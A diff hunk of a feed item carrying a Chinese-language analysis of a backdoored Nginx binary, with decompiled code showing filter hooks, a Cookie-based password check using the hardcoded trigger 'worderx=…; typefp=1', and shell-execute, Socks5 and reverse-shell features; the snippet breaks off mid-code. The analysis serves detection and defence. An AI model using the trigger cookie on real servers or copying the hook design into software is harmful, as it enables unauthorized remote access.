@@ -33,7 +33,7 @@ root@ubuntu:~# netstat -atunlp Active Internet connections (servers and establis
       <description>0) Infected Nginx 使用IDA分析后，发现Nginx被嵌入了一个名为 ngx_http_pwd_init的lua模块
 ngx_int_t __fastcall ngx_http_pwd_init(ngx_conf_t *cf_0) { ngx_http_next_header_filter_11 = ngx_http_top_header_filter; ngx_http_top_header_filter = ngx_http_pwd_header_filter; ngx_http_next_body_filter_10 = ngx_http_top_body_filter; ngx_http_top_body_filter = ngx_http_pwd_body_filter; return 0LL; } 后门主要功能代码在 ngx_http_pwd_header_filter 函数中，该函数可以用来拦截所有的Nginx访问请求头，并对Request中的Cookie信息来验证后门连接密码，以及要执行的功能。
 经分析发现该后门主要有3种功能：
- 1.Shell Execute 2.Socks5 Proxy 3.Reverse Shell  1) Execute shell command 下面截取了一部分的代码，可以发现，通过匹配Cookie中的worderx字段来验证连接后门的密码，typefp字段作为功能的编号，1号是命令执行，最后调用exec_shell(cmd_fd)来返回一个简单的交互式Shell
+ 1.Shell Execute 2.Socks5 Proxy 3.Reverse Shell  1) Shell Execute 下面截取了一部分的代码，可以发现，通过匹配Cookie中的worderx字段来验证连接后门的密码，typefp字段作为功能的编号，1号是命令执行，最后调用exec_shell(cmd_fd)来返回一个简单的交互式Shell
 if ( request-&amp;gt;headers_in.cookies.nelts == 1 ) { v5 = *(_BYTE **)(*(_QWORD *)request-&amp;gt;headers_in.cookies.elts + 0x20LL); v6 = *(_BYTE **)(*(_QWORD *)request-&amp;gt;headers_in.cookies.elts + 0x20LL); v7 = &amp;#34;worderx=Bo9vrZ6TKBmq; typefp=1&amp;#34;; // Match the password, and  v8 = 30LL; do { if ( !</description>
     </item>
     
